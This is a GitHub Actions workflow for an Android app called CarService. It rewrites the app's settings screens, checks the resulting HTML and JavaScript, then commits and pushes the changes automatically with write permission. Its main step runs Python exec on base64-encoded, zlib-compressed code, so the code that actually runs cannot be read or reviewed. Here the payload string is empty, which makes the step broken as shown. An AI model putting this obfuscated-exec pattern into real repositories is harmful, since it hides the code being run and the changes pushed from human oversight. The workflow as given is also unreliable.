name: CarService Haushaltsbuch settings migration

'on':
  push:
    paths:
      - '.github/workflows/household-settings-migration.yml'

permissions:
  contents: write

jobs:
  migrate:
    if: github.repository == 'NoMercy0805/CarService'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Apply Haushaltsbuch settings flow
        run: |
          python3 - <<'PY'
          import base64, zlib
          payload = ''
          exec(zlib.decompress(base64.b64decode(payload)).decode('utf-8'))
          PY

      - name: Verify UI and JavaScript
        run: |
          python3 - <<'PY'
          from pathlib import Path
          import re
          html = Path('app/src/main/assets/index.html').read_text(encoding='utf-8')
          scripts = re.findall(r'<script>(.*?)</script>', html, flags=re.S)
          if len(scripts) != 1:
              raise SystemExit(f'expected one inline script, found {len(scripts)}')
          Path('/tmp/carservice.js').write_text(scripts[0], encoding='utf-8')
          required = ['settingsOverlay','settingsSubOverlay-fahrzeug','settingsSubOverlay-wartung','settingsSubOverlay-darstellung','settingsSubOverlay-daten','settingsSubOverlay-info','settingsCloseBtn']
          for item in required:
              if f'id="{item}"' not in html:
                  raise SystemExit(f'missing {item}')
          if 'page-settings' in html or 'settingsMenuModal' in html:
              raise SystemExit('legacy settings UI remains')
          PY
          node --check /tmp/carservice.js

      - name: Commit settings flow
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add app/src/main/assets/index.html app/src/main/java/com/schiwy/carservice/MainActivity.java
          git diff --cached --check
          git commit -m 'Match settings flow to Haushaltsbuch'
          git push
